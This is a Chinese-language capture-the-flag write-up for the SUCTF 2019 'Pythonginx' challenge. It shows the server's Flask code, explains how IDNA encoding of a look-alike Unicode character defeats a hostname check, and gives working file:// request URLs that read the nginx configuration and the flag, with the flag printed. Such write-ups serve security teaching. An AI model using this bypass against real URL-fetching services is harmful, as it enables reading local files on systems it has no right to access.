# [SUCTF 2019]Pythonginx

[题目地址](https://buuoj.cn/challenges#[SUCTF%202019]Pythonginx)

缝合怪题目名。

网站源码如下：

```python
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <form method="GET" action="getUrl">
        URL:<input type="text" name="url"/>
        <input type="submit" value="Submit"/>
    </form>

    <code>
        
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':   #hostname中不能出现suctf.cc
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]  #不懂这里在检查什么，也是hostname中不能出现suctf.cc的意思
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8')) #先转成idna再用utf-8解码，这里有问题
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname  #经过转换后的url再取出hostname
    if host == 'suctf.cc':  #这回hostname又需要有suctf.cc了，说明正是转换环节出现了问题
        return urllib.request.urlopen(finalUrl).read() #读取url指定的文件。可以用file://协议
    else:
        return "我扌 your problem? 333"
    </code>
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
</body>
</html>
```

[urlparse和urlsplit](https://blog.csdn.net/weixin_47383889/article/details/121521553)基本差不多，只不过urlsplit不支持匹配params字段。[idna](https://www.cnblogs.com/cimuhuashuimu/p/11490431.html)是国际化域名，这篇文章里也写了，先用idna编码再解码会得到不同字符，可用来绕过字符过滤。[wp](https://blog.csdn.net/mochu7777777/article/details/127140963)甚至详细列举了有那些字符经过这种转换可以得到同样的结果。

最后是思考读取什么文件。提示说`Do you know the nginx?`，有点脑洞，竟然要读取nginx的配置文件。

- http://96111498-35f4-446d-882c-9dd2a66c195d.node4.buuoj.cn:81/getUrl?url=file://%F0%9D%91%86uctf.cc/usr/local/nginx/conf/nginx.conf

```
server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }
```

里面写了flag在/usr/fffffflag下。读取完事。

- http://96111498-35f4-446d-882c-9dd2a66c195d.node4.buuoj.cn:81/getUrl?url=file://%F0%9D%91%86uctf.cc/usr/fffffflag

## Flag
> flag{aaacbbaa-3478-461a-873a-c0385f70d7ee}